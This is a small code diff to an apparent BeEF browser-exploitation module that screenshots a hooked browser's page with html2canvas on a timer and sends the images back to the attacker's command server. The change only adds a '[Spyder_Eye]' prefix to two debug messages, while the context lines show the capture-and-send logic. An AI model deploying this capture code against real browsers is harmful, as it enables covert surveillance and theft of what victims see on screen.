@@ -16,7 +16,7 @@ beef.execute(function() {
 	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
 	    	});
 
-	    	beef.debug('html2canvas hasn\'t failed, that\'s something');
+	    	beef.debug('[Spyder_Eye] html2canvas hasn\'t failed, that\'s something');
 	    }
 	    catch (e) {
 	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
@@ -25,7 +25,7 @@ beef.execute(function() {
 
 	takeit = function() {
 		for(var i = 0; i < takes; i++) {
-			beef.debug('Taking ' + i + '. snapshot');
+			beef.debug('[Spyder_Eye] Taking ' + i + '. snapshot');
 			setTimeout(snap, delay * i);
 		}
 	};
